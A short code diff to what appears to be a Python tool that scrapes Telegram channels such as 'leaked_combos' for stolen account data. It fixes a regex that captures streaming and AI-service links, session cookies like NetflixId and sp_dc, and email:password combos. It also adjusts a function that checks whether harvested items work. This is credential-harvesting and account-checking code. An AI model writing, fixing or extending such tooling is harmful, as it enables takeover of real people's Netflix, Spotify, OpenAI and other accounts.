@@ -38,10 +38,9 @@ TELEGRAM_CHANNELS = [
     "chatgpt_accounts", "openai_accounts", "gaming_drops", "leaked_combos"
 ]
 
+# FEHLER BEHOBEN: Das | ist jetzt INNERHALB der Anführungszeichen
 PATTERN = re.compile(
-    r'(https?://(?:www\.)?(?:netflix|spotify|disneyplus|rtlplus|crunchyroll|steam|minecraft|openai|chatgpt)\.(?:com|de|net)/[^\s<"]+)' |
-    r'((?:NetflixId|SecureNetflixId|sp_dc|sp_key|token|session)=[^;\s]+)' |
-    r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}:[^\s]+)',
+    r'(https?://(?:www\.)?(?:netflix|spotify|disneyplus|rtlplus|crunchyroll|steam|minecraft|openai|chatgpt)\.(?:com|de|net)/[^\s<"]+)|((?:NetflixId|SecureNetflixId|sp_dc|sp_key|token|session)=[^;\s]+)|([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}:[^\s]+)',
     re.IGNORECASE
 )
 
@@ -61,6 +60,10 @@ def get_platform(item):
     return "combo"
 
 def test_item(item):
+    platform = get_platform(item)
+    if platform == "spotify":
+        return ':' in item and '@' in item
+    
     if ':' in item and '@' in item: return True
     headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
     try:
